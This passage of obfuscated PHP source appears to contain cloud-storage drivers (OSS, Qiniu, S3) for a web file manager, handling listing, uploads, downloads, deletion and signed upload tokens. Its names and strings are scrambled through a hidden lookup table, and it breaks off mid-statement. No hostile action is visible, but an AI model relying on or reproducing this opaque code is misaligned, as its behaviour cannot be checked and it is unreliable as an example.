. $¡ÎÏ‘÷Ò); die; } public function hashMd5($ÅØ°ğƒİ, $ÇÛ±µ›Ò = '') { $şÒô€ëõ =& $_SERVER[•€áå–Õ]; $Ó‘Ñâàİ = $this->_objectMeta($ÅØ°ğƒİ); if (!$Ó‘Ñâàİ) { return $şÒô€ëõ[22]; } if (!isset($Ó‘Ñâàİ[$şÒô€ëõ[1430]]) && !empty($ÇÛ±µ›Ò)) { $“»ÚÙÃ = $this->updateObjMeta($ÅØ°ğƒİ, array($şÒô€ëõ[1430] => $ÇÛ±µ›Ò)); $Ó‘Ñâàİ[$şÒô€ëõ[1430]] = $“»ÚÙÃ ? $ÇÛ±µ›Ò : $şÒô€ëõ[22]; } return isset($Ó‘Ñâàİ[$şÒô€ëõ[1430]]) ? strtolower($Ó‘Ñâàİ[$şÒô€ëõ[1430]]) : $şÒô€ëõ[22]; } public function size($ıÜç¤éÀ) { $´°«·¨æ = $this->objectMeta($ıÜç¤éÀ); return $´°«·¨æ ? $´°«·¨æ[$_SERVER[•€áå–Õ][88]] : 0; } public function info($•’óÀ’) { if ($this->isFolder($•’óÀ’)) { return $this->folderInfo($•’óÀ’); } else { if ($this->isFile($•’óÀ’)) { return $this->fileInfo($•’óÀ’); } } return !1; } public function exist($¼ÓĞ²£ñ) { return $this->isFile($¼ÓĞ²£ñ) || $this->isFolder($¼ÓĞ²£ñ); } public function isFile($úÉòùÇ¢) { return !$this->isFolder($úÉòùÇ¢) && $this->objectMeta($úÉòùÇ¢); } public function isFolder($€¦†âŒ¦) { return $this->cacheMethod($_SERVER[•€áå–Õ][178], $€¦†âŒ¦); } protected function objectMeta($¢íâ£ÌÛ) { return $this->cacheMethod($_SERVER[•€áå–Õ][180], $¢íâ£ÌÛ); } protected function _objectMeta($õ­şöàÅ) { $Ü‰»¡ ß =& $_SERVER[•€áå–Õ]; try { $Ô§‰Ö’§ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($õ­şöàÅ)); } catch (OSS\Core\OssException $û³‚Ğäƒ) { $Ô§‰Ö’§ = !1; } if ($Ô§‰Ö’§) { $Ô§‰Ö’§[$Ü‰»¡ ß[88]] = intval($Ô§‰Ö’§[$Ü‰»¡ ß[1428]]); } return $Ô§‰Ö’§; } protected function _isFolder($˜¡·ŒÚ…) { $ùõø†Ü÷ =& $_SERVER[•€áå–Õ]; if ($˜¡·ŒÚ… == $ùõø†Ü÷[22] || $˜¡·ŒÚ… == $ùõø†Ü÷[18]) { return !0; } $‡‘…ÕÌ = array($ùõø†Ü÷[1423] => $ùõø†Ü÷[18], $ùõø†Ü÷[1424] => rtrim($˜¡·ŒÚ…, $ùõø†Ü÷[18]) . $ùõø†Ü÷[18], $ùõø†Ü÷[1425] => 1, $ùõø†Ü÷[1426] => $ùõø†Ü÷[22]); $Òá¯§À´ = $this->client->listObjects($this->bucket, $‡‘…ÕÌ); if ($Òá¯§À´->getObjectList() || $Òá¯§À´->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Û¦Ë·Ÿ°) { parent::__construct(); require_once SDK_DIR . $_SERVER[•€áå–Õ][1454]; $this->_init($Û¦Ë·Ÿ°); } public function _init($Øí†õ) { $ù¾·“… =& $_SERVER[•€áå–Õ]; $this->config = $Øí†õ; foreach ($Øí†õ as $öØÕ¢ => $¿¾ôé‹•) { if (isset($this->{$öØÕ¢})) { $this->{$öØÕ¢} = $¿¾ôé‹•; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ù¾·“…[1455] . LNG($ù¾·“…[1414])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($§Ûçùš, $¡œ¬€´ğ = '', $â‡’º¦Ö = REPEAT_RENAME) { if ($this->setContent($§Ûçùš, $¡œ¬€´ğ)) { return $this->getPathOuter($§Ûçùš); } return !1; } public function mkdir($ÍÆÈç€, $‘ÓëÄÚ = REPEAT_SKIP) { $©œÙõñÍ =& $_SERVER[•€áå–Õ]; $Œ‡Ã²Š = trim($ÍÆÈç€, $©œÙõñÍ[18]); if ($this->_isFolder($Œ‡Ã²Š)) { return $this->getPathOuter($Œ‡Ã²Š); } $ÍÆÈç€ = $Œ‡Ã²Š . $©œÙõñÍ[18]; $å¯×¡ù² = get_path_this($Œ‡Ã²Š); $µËÑş = $ÍÆÈç€ . $å¯×¡ù²; if (!$this->mkfile($µËÑş)) { return !1; } if (!$this->moveFile($µËÑş, $ÍÆÈç€)) { $this->delFile($µËÑş); return !1; } return $this->getPathOuter($Œ‡Ã²Š); } public function copyFile($¢ÏôÕô, $×¸Ô¯Û) { $‰ÖòµÈ = $this->bucketManager->copy($this->bucket, $¢ÏôÕô, $this->bucket, $×¸Ô¯Û, !0); return $‰ÖòµÈ ? !1 : $this->getPathOuter($×¸Ô¯Û); } public function moveFile($¶âµü»º, $ï²·ëœ) { $°æÈ¸ş½ = $this->bucketManager->move($this->bucket, $¶âµü»º, $this->bucket, $ï²·ëœ, !0); return $°æÈ¸ş½ ? !1 : $this->getPathOuter($ï²·ëœ); } public function delFile($öœ¬Î“€) { if (!$this->exist($öœ¬Î“€)) { return !0; } $œŒ½˜„ = $this->bucketManager->delete($this->bucket, $öœ¬Î“€); return $œŒ½˜„ ? !1 : !0; } public function delFolder($“ˆæùå©) { $’ãÁò¸— =& $_SERVER[•€áå–Õ]; if (!$this->exist($“ˆæùå©)) { return !0; } $this->listItemCache = !1; $Ùë„¡•± = $this->fileList($“ˆæùå©); $this->listItemCache = !0; $‡´‰Ğä¤ = trim($“ˆæùå©, $’ãÁò¸—[18]) . $’ãÁò¸—[18]; if (!empty($“ˆæùå©) && $“ˆæùå© !== $’ãÁò¸—[224] && !in_array($‡´‰Ğä¤, $Ùë„¡•±[$’ãÁò¸—[94]])) { $Ùë„¡•±[$’ãÁò¸—[94]][] = $‡´‰Ğä¤; } $¶«è÷ì = $this->delByBatch($Ùë„¡•±[$’ãÁò¸—[95]]); if (!$¶«è÷ì) { return !1; } $¶«è÷ì = $this->delByBatch($Ùë„¡•±[$’ãÁò¸—[94]]); if (!$¶«è÷ì) { return !1; } return $this->delFile($‡´‰Ğä¤); } private function delByBatch($®Ì¾õŸã) { foreach (array_chunk($®Ì¾õŸã, 1000) as $ñÛä¯ê·) { $¥™¹‘½Í = $this->bucketManager->buildBatchDelete($this->bucket, $ñÛä¯ê·); list($ÊŸÀÍÜí, $¶Â¸äéÔ) = $this->bucketManager->batch($¥™¹‘½Í); if ($¶Â¸äéÔ) { return !1; } } return !0; } public function rename($´şÏÆÉ, $Ô®¬©è«) { return $this->renameObject($´şÏÆÉ, $Ô®¬©è«); } public function fileInfo($ôé££„¸, $¶¬µ°æ‘ = false, $éÅŞú¿  = array()) { $•¨‡â Ÿ =& $_SERVER[•€áå–Õ]; $Š¡Ó¼£î = array($•¨‡â Ÿ[42] => $this->pathThis($ôé££„¸), $•¨‡â Ÿ[96] => $this->getPathOuter($•¨‡â Ÿ[18] . $ôé££„¸), $•¨‡â Ÿ[43] => $•¨‡â Ÿ[226], $•¨‡â Ÿ[88] => isset($éÅŞú¿ [$•¨‡â Ÿ[1456]]) ? $éÅŞú¿ [$•¨‡â Ÿ[1456]] : 0, $•¨‡â Ÿ[187] => $this->ext($ôé££„¸)); if ($¶¬µ°æ‘) { return $Š¡Ó¼£î; } $Š¡Ó¼£î[$•¨‡â Ÿ[227]] = $Š¡Ó¼£î[$•¨‡â Ÿ[97]] = 0; $Š¡Ó¼£î[$•¨‡â Ÿ[228]] = $Š¡Ó¼£î[$•¨‡â Ÿ[229]] = !0; if (empty($éÅŞú¿ )) { $éÅŞú¿  = $this->objectMeta($ôé££„¸); if (!$éÅŞú¿ ) { return $Š¡Ó¼£î; } } if (isset($éÅŞú¿ [$•¨‡â Ÿ[230]]) && $éÅŞú¿ [$•¨‡â Ÿ[230]]) { $Š¡Ó¼£î[$•¨‡â Ÿ[231]] = $éÅŞú¿ [$•¨‡â Ÿ[230]]; } if (isset($éÅŞú¿ [$•¨‡â Ÿ[240]]) && $éÅŞú¿ [$•¨‡â Ÿ[240]]) { $Š¡Ó¼£î[$•¨‡â Ÿ[231]] = $éÅŞú¿ [$•¨‡â Ÿ[240]]; } if (isset($éÅŞú¿ [$•¨‡â Ÿ[1457]])) { $Š¡Ó¼£î[$•¨‡â Ÿ[97]] = substr($éÅŞú¿ [$•¨‡â Ÿ[1457]] . $•¨‡â Ÿ[22], 0, 10); } if (isset($éÅŞú¿ [$•¨‡â Ÿ[1456]])) { $Š¡Ó¼£î[$•¨‡â Ÿ[88]] = $éÅŞú¿ [$•¨‡â Ÿ[1456]]; } return $Š¡Ó¼£î; } public function folderInfo($óĞœğ‰, $ÅÏÊ—õ = false) { $””âÉ· =& $_SERVER[•€áå–Õ]; $çãÅÎ¾§ = array($””âÉ·[42] => $this->pathThis($óĞœğ‰), $””âÉ·[96] => $this->getPathOuter($””âÉ·[18] . $óĞœğ‰), $””âÉ·[43] => $””âÉ·[87]); if ($ÅÏÊ—õ) { return $çãÅÎ¾§; } $çãÅÎ¾§[$””âÉ·[227]] = $çãÅÎ¾§[$””âÉ·[97]] = 0; $çãÅÎ¾§[$””âÉ·[228]] = $çãÅÎ¾§[$””âÉ·[229]] = !0; $óĞœğ‰ = rtrim($óĞœğ‰, $””âÉ·[18]) . $””âÉ·[18]; $ºË«¿Š† = $this->objectMeta($óĞœğ‰); if (isset($ºË«¿Š†[$””âÉ·[1457]])) { $çãÅÎ¾§[$””âÉ·[97]] = substr($ºË«¿Š†[$””âÉ·[1457]] . $””âÉ·[22], 0, 10); } return $çãÅÎ¾§; } public function listPath($¥éœ¡Ğâ, $Æ¹ş– Ò = false) { $—ŒÇÇˆ½ =& $_SERVER[•€áå–Õ]; $Íúûø = $this->fileList($¥éœ¡Ğâ, $—ŒÇÇˆ½[18], !0); foreach ($Íúûø[$—ŒÇÇˆ½[94]] as $¯áãè¢ù => $şÁ¨—äÜ) { $Íúûø[$—ŒÇÇˆ½[94]][$¯áãè¢ù] = $this->folderInfo($şÁ¨—äÜ, $Æ¹ş– Ò); } foreach ($Íúûø[$—ŒÇÇˆ½[95]] as $¯áãè¢ù => $şÁ¨—äÜ) { $Íúûø[$—ŒÇÇˆ½[95]][$¯áãè¢ù] = $this->fileInfo($şÁ¨—äÜ[$—ŒÇÇˆ½[106]], $Æ¹ş– Ò, $şÁ¨—äÜ); } return $Íúûø; } public function has($¢Ÿí¯œ³, $Çê¤Ñ‹ = false, $ü¸Ô’œ§ = true) { $çüóƒ§± =& $_SERVER[•€áå–Õ]; $¢Ÿí¯œ³ = trim($¢Ÿí¯œ³, $çüóƒ§±[18]); $ÓÄßåá× = empty($¢Ÿí¯œ³) && $¢Ÿí¯œ³ !== $çüóƒ§±[224] ? $çüóƒ§±[22] : $¢Ÿí¯œ³ . $çüóƒ§±[18]; $¹Æ˜©á = $çüóƒ§±[22]; $¥î¨³úã = 500; $³£¼¦ôø = $çüóƒ§±[18]; $®óäıßÚ = $‘•ì«œ“ = 0; while (!0) { check_abort(); list($üäÀà­±, $ôº­¸ò) = $this->bucketManager->listFiles($this->bucket, $ÓÄßåá×, $¹Æ˜©á, $¥î¨³úã, $³£¼¦ôø); if ($ôº­¸ò) { break; } $¹Æ˜©á = array_key_exists($çüóƒ§±[1426], $üäÀà­±) ? $¹Æ˜©á = $üäÀà­±[$çüóƒ§±[1458]] : $çüóƒ§±[22]; if ($Çê¤Ñ‹) { if (!empty($üäÀà­±[$çüóƒ§±[1459]])) { $®óäıßÚ += count($üäÀà­±[$çüóƒ§±[1459]]); } if (!empty($üäÀà­±[$çüóƒ§±[1460]])) { $‘•ì«œ“ += count($üäÀà­±[$çüóƒ§±[1460]]); } if ($¹Æ˜©á === $çüóƒ§±[22]) { break; } continue; } if ($ü¸Ô’œ§) { if (!empty($üäÀà­±[$çüóƒ§±[1459]])) { return !0; } } else { if (!empty($üäÀà­±[$çüóƒ§±[1460]])) { return !0; } } if ($¹Æ˜©á === $çüóƒ§±[22]) { break; } } if ($Çê¤Ñ‹) { return array($çüóƒ§±[235] => $®óäıßÚ, $çüóƒ§±[236] => $‘•ì«œ“); } return !1; } public function listAll($ü…ÚòôÌ) { $Ì­àÓ¨Ä =& $_SERVER[•€áå–Õ]; $©Ú“‚à = $this->fileList($ü…ÚòôÌ, $Ì­àÓ¨Ä[22], !0); $ÑŒ›¨à = array_to_keyvalue($©Ú“‚à[$Ì­àÓ¨Ä[95]], $Ì­àÓ¨Ä[42]); foreach ($©Ú“‚à[$Ì­àÓ¨Ä[94]] as $íó¶Şïû) { if (is_string($íó¶Şïû)) { $ÑŒ›¨à[$íó¶Şïû] = array($Ì­àÓ¨Ä[88] => 0); } } return $this->listAllFiles($ü…ÚòôÌ, $ÑŒ›¨à); } private function fileList($Ù©™ê², $®×¨ñà = '', $ÃğÌ’ÈÏ = 0) { $èÕé¬Âô =& $_SERVER[•€áå–Õ]; $Ù©™ê² = trim($Ù©™ê², $èÕé¬Âô[18]); $¤¯ÁóÍ” = empty($Ù©™ê²) && $Ù©™ê² !== $èÕé¬Âô[224] ? $èÕé¬Âô[22] : $Ù©™ê² . $èÕé¬Âô[18]; $‚Ô¥Ó¸Ï = $èÕé¬Âô[22]; $¦ƒ«áİô = 1000; $ğ”ï±æî = $¸ìö´Ğ = array(); while (!0) { check_abort(); list($¬¯­¦•€, $‚ş’ëàä) = $this->bucketManager->listFiles($this->bucket, $¤¯ÁóÍ”, $‚Ô¥Ó¸Ï, $¦ƒ«áİô, $®×¨ñà); if ($‚ş’ëàä) { break; } $‚Ô¥Ó¸Ï = array_key_exists($èÕé¬Âô[1426], $¬¯­¦•€) ? $‚Ô¥Ó¸Ï = $¬¯­¦•€[$èÕé¬Âô[1458]] : $èÕé¬Âô[22]; $ŒğÅªÍ· = isset($¬¯­¦•€[$èÕé¬Âô[1459]]) ? $¬¯­¦•€[$èÕé¬Âô[1459]] : array(); $àêæ»¥ = isset($¬¯­¦•€[$èÕé¬Âô[1460]]) ? $¬¯­¦•€[$èÕé¬Âô[1460]] : array(); foreach ($ŒğÅªÍ· as $É¹ä—Á€) { if ($É¹ä—Á€[$èÕé¬Âô[106]] == $¤¯ÁóÍ”) { continue; } $Ø‹ÅÇ£ = $É¹ä—Á€[$èÕé¬Âô[106]]; $çÎÑÔÃï = $É¹ä—Á€[$èÕé¬Âô[1456]]; $É¹ä—Á€[$èÕé¬Âô[88]] = $çÎÑÔÃï; $ÖÍ¯´œê = $çÎÑÔÃï == 0 && substr($Ø‹ÅÇ£, strlen($Ø‹ÅÇ£) - 1, 1) == $èÕé¬Âô[18] ? !0 : !1; $this->cacheMethodInfoSet($Ø‹ÅÇ£, $ÖÍ¯´œê, $É¹ä—Á€); if ($ÖÍ¯´œê) { $ğ”ï±æî[] = $Ø‹ÅÇ£; continue; } $¸ìö´Ğ[] = $ÃğÌ’ÈÏ ? $É¹ä—Á€ : $Ø‹ÅÇ£; } foreach ($àêæ»¥ as $Ø‹ÅÇ£) { if ($Ø‹ÅÇ£ == $¤¯ÁóÍ”) { continue; } $ğ”ï±æî[] = $Ø‹ÅÇ£; $this->cacheMethodInfoSet($Ø‹ÅÇ£, !0); } if ($‚Ô¥Ó¸Ï === $èÕé¬Âô[22]) { break; } } $this->cacheMethodInfoSet($Ù©™ê², !0); return array($èÕé¬Âô[94] => $ğ”ï±æî, $èÕé¬Âô[95] => $¸ìö´Ğ); } public function canRead($ËƒïßªŠ) { return $this->exist($ËƒïßªŠ) ? !0 : !1; } public function canWrite($—À›á’”) { return $this->exist($—À›á’”) ? !0 : !1; } public function getContent($ß¡‰ûİœ) { return $this->fileSubstr($ß¡‰ûİœ, 0, -1); } public function setContent($ ’ó¤Œ¯, $¿§İõ™ê = '') { $Íœ«äÁ³ = $this->tempFile($this->pathThis($ ’ó¤Œ¯)); file_put_contents($Íœ«äÁ³, $¿§İõ™ê); if ($this->upload($ ’ó¤Œ¯, $Íœ«äÁ³)) { $this->tempFileRemve($Íœ«äÁ³); return !0; } return !1; } public function refreshUrls($¿¶Şú‡—) { $£ºÏàªş =& $_SERVER[•€áå–Õ]; $ûÇÖÈ» = array(); if (is_array($¿¶Şú‡—)) { foreach ($¿¶Şú‡— as $ï³¹™ŒÇ) { $ûÇÖÈ»[] = $this->link($ï³¹™ŒÇ); } } else { $ûÇÖÈ»[] = $this->link($¿¶Şú‡—); } $êóğÒ˜í = new Qiniu\Cdn\CdnManager($this->auth); list($†ıÍ³‘£, $Œæ°¥ú¨) = $êóğÒ˜í->refreshUrls($ûÇÖÈ»); if ($Œæ°¥ú¨) { return !1; } return $†ıÍ³‘£[$£ºÏàªş[1223]] == $£ºÏàªş[800] ? !0 : !1; } public function fileSubstr($Ö¤¨ß ¤, $Áúæ¦…ü, $›µüÏÛ) { $×ëõÁèò =& $_SERVER[•€áå–Õ]; if (!($şºÖ®ˆ¬ = $this->link($Ö¤¨ß ¤))) { return !1; } $›ïÈÈæî = !1; if ($›µüÏÛ > 0) { $”õµàæ” = $Áúæ¦…ü + $›µüÏÛ - 1; $›ïÈÈæî = array($×ëõÁèò[1461] . $Áúæ¦…ü . $×ëõÁèò[441] . $”õµàæ”); } $÷ç»Ÿ£ô = url_request($şºÖ®ˆ¬, $×ëõÁèò[257], !1, $›ïÈÈæî); return $÷ç»Ÿ£ô[$×ëõÁèò[791]] ? $÷ç»Ÿ£ô[$×ëõÁèò[1243]] : !1; } public function upload($÷äÔ«‹, $¢ñ±ŠÉ¤, $¥«Ñ¨Âê = false, $ä‡» ‚¿ = REPEAT_REPLACE) { $¸¡ƒ«È£ = new Qiniu\Storage\UploadManager(); $¨øŒÂë­ = $this->auth->uploadToken($this->bucket, $÷äÔ«‹); $¾¢¼Øşç = get_file_mime(get_path_ext($¢ñ±ŠÉ¤)); list($âï“å«û, $ÓÕŒ€Œ) = $¸¡ƒ«È£->putFile($¨øŒÂë­, $÷äÔ«‹, $¢ñ±ŠÉ¤, null, $¾¢¼Øşç); return $ÓÕŒ€Œ ? !1 : $this->getPathOuter($÷äÔ«‹); } public function uploadFormData($ÉâÑÜ®ñ, $ùÂ•Ñ¸Ù = 3600) { return $this->uploadToken($ÉâÑÜ®ñ, $ùÂ•Ñ¸Ù); } public function multiUploadFormData($ÖšÀÁÂ, $Ï ĞæÄû = 3600) { return $this->uploadToken($ÖšÀÁÂ, $Ï ĞæÄû); } private function uploadToken($Æ¬Ê¦ é, $‹”Šü˜‡ = 3600) { $òƒÇéŒõ =& $_SERVER[•€áå–Õ]; $äİ’ÕÏê = $‹”Šü˜‡; $ü‹¬ß‘˜ = array($òƒÇéŒõ[1462] => $òƒÇéŒõ[1463]); $ìÃ‡Æ£û = $Æ¬Ê¦ é; $Ì¯Õ¨·Ë = $this->auth->uploadToken($this->bucket, $ìÃ‡Æ£û, $äİ’ÕÏê, $ü‹¬ß‘˜, !0); $û¤—Ãç« = empty($this->region) || $this->region == $òƒÇéŒõ[1464] ? $òƒÇéŒõ[22] : $òƒÇéŒõ[441] . $this->region; $•ä‹¨šç = http_type() . "\72\x2f\x2f\x75\x70\154\157\141\x64{$û¤—Ãç«}\x2e\x71\151\x6e\151\x75\x70\x2e\143\x6f\x6d\x2f"; return array($òƒÇéŒõ[1465] => $Ì¯Õ¨·Ë, $òƒÇéŒõ[1466] => $•ä‹¨šç); } public function download($„’‹½¼Ò, $™ê¥ÖÈ„) { $«ãø ó¶ = IO::getPathInner(IO::mkfile($™ê¥ÖÈ„)); if (!($ÌŞŒÂÎû = $this->link($„’‹½¼Ò))) { return !1; } $—Ø¦ûÖ­ = 0; $î¶ÈÜÍé = 1024 * 200; $ïĞìŸ€ = fopen($«ãø ó¶, $_SERVER[•€áå–Õ][1467]); while (!0) { $†­¤’ãÁ = $this->fileSubstr($„’‹½¼Ò, $—Ø¦ûÖ­, $î¶ÈÜÍé); if ($†­¤’ãÁ === !1) { return !1; } fwrite($ïĞìŸ€, $†­¤’ãÁ); $—Ø¦ûÖ­ += $î¶ÈÜÍé; if (strlen($†­¤’ãÁ) < $î¶ÈÜÍé) { break; } } fclose($ïĞìŸ€); return $™ê¥ÖÈ„; } public function link($Î¹úèÜÆ, $¼ò‚Ì¥ = '') { if (!$this->isFile($Î¹úèÜÆ)) { return !1; } $‰«ˆş§Ú = $this->getHost() . $_SERVER[•€áå–Õ][18] . $this->pathEncode($Î¹úèÜÆ) . $¼ò‚Ì¥; return $this->auth->privateDownloadUrl($‰«ˆş§Ú, 3600 * 12); } public function fileOut($—‡‚¿ŒŸ, $åß²ÅÏ° = false, $›ß¬‚ã = false, $¼ê€¡ˆ = '') { $±€ïü£• =& $_SERVER[•€áå–Õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($—‡‚¿ŒŸ, $åß²ÅÏ°, $›ß¬‚ã, $¼ê€¡ˆ); } if (!$›ß¬‚ã) { $›ß¬‚ã = $this->pathThis($—‡‚¿ŒŸ); } $©Õğ‡® = $åß²ÅÏ° ? $±€ïü£•[1468] . rawurlencode($›ß¬‚ã) : $±€ïü£•[22]; $§¹š§ı = $this->link($—‡‚¿ŒŸ, $©Õğ‡®); $this->fileOutLink($§¹š§ı); } public function fileOutServer($…ÒŸ¶™½, $‰ïıÚÈ– = false, $€å†¼èİ = false, $§“î™¶¤ = '') { parent::fileOut($…ÒŸ¶™½, $‰ïıÚÈ–, $€å†¼èİ, $§“î™¶¤); } public function fileOutImage($ËÒÆ£ôû, $Å¾À¥ú“ = 250) { $ÁüµÂ«Ú = $this->link($ËÒÆ£ôû, $_SERVER[•€áå–Õ][1469] . $Å¾À¥ú“); $this->fileOutLink($ÁüµÂ«Ú); } public function fileOutImageServer($ıç•»íÆ, $ê¥Ùª¨ô = 250) { parent::fileOutImage($ıç•»íÆ, $ê¥Ùª¨ô); } public function hashMd5($¹ö’¿«¥) { $İÙ›•áÌ =& $_SERVER[•€áå–Õ]; $Ñ¾…Å’° = $this->objectMeta($¹ö’¿«¥); return isset($Ñ¾…Å’°[$İÙ›•áÌ[240]]) ? $Ñ¾…Å’°[$İÙ›•áÌ[240]] : !1; $™É¨Æİí = $this->link($¹ö’¿«¥, $İÙ›•áÌ[1470]); } public function size($úã…Ó) { $ìâ¤şı = $this->objectMeta($úã…Ó); return $ìâ¤şı ? $ìâ¤şı[$_SERVER[•€áå–Õ][88]] : 0; } public function info($Ê€Í†ïê) { if ($this->isFolder($Ê€Í†ïê)) { return $this->folderInfo($Ê€Í†ïê); } else { if ($this->isFile($Ê€Í†ïê)) { return $this->fileInfo($Ê€Í†ïê); } } return !1; } public function exist($œ¤Ü»Ÿ) { return $this->isFile($œ¤Ü»Ÿ) || $this->isFolder($œ¤Ü»Ÿ); } public function isFile($­âæş„À) { return !$this->isFolder($­âæş„À) && $this->objectMeta($­âæş„À); } public function isFolder($ùïïÈÂ) { return $this->cacheMethod($_SERVER[•€áå–Õ][178], $ùïïÈÂ); } protected function objectMeta($ëÖ™±´Ó) { return $this->cacheMethod($_SERVER[•€áå–Õ][180], $ëÖ™±´Ó); } protected function _objectMeta($£±ø×„) { $àµğ¦»£ =& $_SERVER[•€áå–Õ]; list($ª×¹¡„Ä, $ıçÈ©Û») = $this->bucketManager->stat($this->bucket, $£±ø×„); if ($ª×¹¡„Ä) { $ª×¹¡„Ä[$àµğ¦»£[88]] = intval($ª×¹¡„Ä[$àµğ¦»£[1456]]); } return $ª×¹¡„Ä; } protected function _isFolder($ıèæç”Ë) { $·½×© =& $_SERVER[•€áå–Õ]; if ($ıèæç”Ë == $·½×©[22] || $ıèæç”Ë == $·½×©[18]) { return !0; } list($á°’¬¦Í, $Ï²ò¹ÑÃ) = $this->bucketManager->listFiles($this->bucket, trim($ıèæç”Ë, $·½×©[18]) . $·½×©[18], $·½×©[22], 1, $·½×©[18]); return !empty($á°’¬¦Í[$·½×©[1459]]) || !empty($á°’¬¦Í[$·½×©[1460]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($œ¾İ¹òÂ) { parent::__construct($œ¾İ¹òÂ); } public function uploadFormData($–ƒãñ, $²¤Ü‡ñ = 3600) { $¯‰˜Á÷È =& $_SERVER[•€áå–Õ]; $¶ ºÙŒ = $¯‰˜Á÷È[225]; $œ÷ª”” = $¯‰˜Á÷È[264]; $ÅÔÕ•©¸ = $¯‰˜Á÷È[72]; $¿Ğ›œ¬Å = gmdate($¯‰˜Á÷È[265]); $ˆĞåøÁ = gmdate($¯‰˜Á÷È[266]); $«ô’¸Ñ = $¯‰˜Á÷È[267]; $¶«•»’¼ = $²¤Ü‡ñ . $¯‰˜Á÷È[22]; $öƒöøçù = $¯‰˜Á÷È[268]; $­«•ø’¸ = array($this->accessKey, $ˆĞåøÁ, $this->region, $ÅÔÕ•©¸, $«ô’¸Ñ); $£ÜÍ³òÜ = implode($¯‰˜Á÷È[18], $­«•ø’¸); $Íáà™ğ¿ = array($¯‰˜Á÷È[269] => gmdate($¯‰˜Á÷È[1366], strtotime($¯‰˜Á÷È[271])), $¯‰˜Á÷È[272] => array(array($¯‰˜Á÷È[273] => $this->bucket), array($¯‰˜Á÷È[274] => $¶ ºÙŒ), array($¯‰˜Á÷È[275], $¯‰˜Á÷È[276], $¯‰˜Á÷È[22]), array($¯‰˜Á÷È[275], $¯‰˜Á÷È[277], $¯‰˜Á÷È[22]), array($¯‰˜Á÷È[275], $¯‰˜Á÷È[278], $¯‰˜Á÷È[22]), array($¯‰˜Á÷È[279] => $öƒöøçù), array($¯‰˜Á÷È[280] => $£ÜÍ³òÜ), array($¯‰˜Á÷È[281] => $œ÷ª””), array($¯‰˜Á÷È[282] => $¿Ğ›œ¬Å), array($¯‰˜Á÷È[283] => $¶«•»’¼))); $œÔ¦Ì«ì = base64_encode(json_encode($Íáà™ğ¿)); $ºÓ§éÓ = hash_hmac($¯‰˜Á÷È[284], $ˆĞåøÁ, $¯‰˜Á÷È[285] . $this->secret, !0); $÷İï€± = hash_hmac($¯‰˜Á÷È[284], $this->region, $ºÓ§éÓ, !0); $®ä¹ç• = hash_hmac($¯‰˜Á÷È[284], $ÅÔÕ•©¸, $÷İï€±, !0); $ÇØ“¼ºå = hash_hmac($¯‰˜Á÷È[284], $«ô’¸Ñ, $®ä¹ç•, !0); $Éâ…Éñ¢ = hash_hmac($¯‰˜Á÷È[284], $œÔ¦Ì«ì, $ÇØ“¼ºå); $ä‘–Ë¤ˆ = array($¯‰˜Á÷È[242] => $¯‰˜Á÷È[22], $¯‰˜Á÷È[286] => $¯‰˜Á÷È[22], $¯‰˜Á÷È[274] => $¶ ºÙŒ, $¯‰˜Á÷È[279] => $öƒöøçù, $¯‰˜Á÷È[287] => $œÔ¦Ì«ì, $¯‰˜Á÷È[288] => $£ÜÍ³òÜ, $¯‰˜Á÷È[289] => $œ÷ª””, $¯‰˜Á÷È[290] => $¿Ğ›œ¬Å, $¯‰˜Á÷È[291] => $¶«•»’¼, $¯‰˜Á÷È[292] => $Éâ…Éñ¢, $¯‰˜Á÷È[208] => $this->getHost()); return $ä‘–Ë¤ˆ; } public function multiUploadFormData($ªô—ÀåÃ, $Ü ßÊ¹À = 3600) { $ˆÕÜ£ =& $_SERVER[•€áå–Õ]; $ã½£½«ü = gmdate($ˆÕÜ£[1471]); $ˆÁ´ó½æ = array(); $˜®„Á´ = $this->client->getUploadId($this->bucket, $ªô—ÀåÃ, $ˆÁ´ó½æ); if (!$˜®„Á´) { return !1; } return array($ˆÕÜ£[250] => $˜®„Á´, $ˆÕÜ£[208] => $this->getHost() . $ˆÕÜ£[18] . $this->pathEncode($ªô—ÀåÃ), $ˆÕÜ£[251] => $ã½£½«ü, $ˆÕÜ£[106] => $ªô—ÀåÃ); } public function multiUploadAuthData($Ú‚•øëß, $Âö®ŸŸ… = array()) { $öö±™ÍÛ =& $_SERVER[•€áå–Õ]; $ª—ù’ˆ = isset($Âö®ŸŸ…[$öö±™ÍÛ[187]]) ? $Âö®ŸŸ…[$öö±™ÍÛ[187]] : $öö±™ÍÛ[22]; $û…ìÀ¡ = $Âö®ŸŸ…[$öö±™ÍÛ[106]]; unset($Âö®ŸŸ…[$öö±™ÍÛ[106]]); if (isset($Âö®ŸŸ…[$öö±™ÍÛ[252]])) { return $this->listUploadParts($û…ìÀ¡, $Âö®ŸŸ…); } $»ü«ìÂÎ = array(); if (isset($Âö®ŸŸ…[$öö±™ÍÛ[1472]])) { $»ü«ìÂÎ[$öö±™ÍÛ[1473]] = $Âö®ŸŸ…[$öö±™ÍÛ[1472]]; } $ÇĞ÷â²Ï = explode($öö±™ÍÛ[210], $this->getHost()); $¯´­‹ïœ = array($öö±™ÍÛ[1474] => $ÇĞ÷â²Ï[1], $öö±™ÍÛ[1475] => $öö±™ÍÛ[22], $öö±™ÍÛ[242] => $öö±™ÍÛ[132], $öö±™ÍÛ[286] => $Âö®ŸŸ…[$öö±™ÍÛ[88]]); $ş¾È“ š = $öö±™ÍÛ[255]; $±ø…¦÷ = $öö±™ÍÛ[18] . $this->pathEncode($û…ìÀ¡) . $ª—ù’ˆ; $íµÄ²ìƒ = $this->client->__getSignatureV4($»ü«ìÂÎ, $¯´­‹ïœ, $ş¾È“ š, $±ø…¦÷); if (strpos($ª—ù’ˆ, 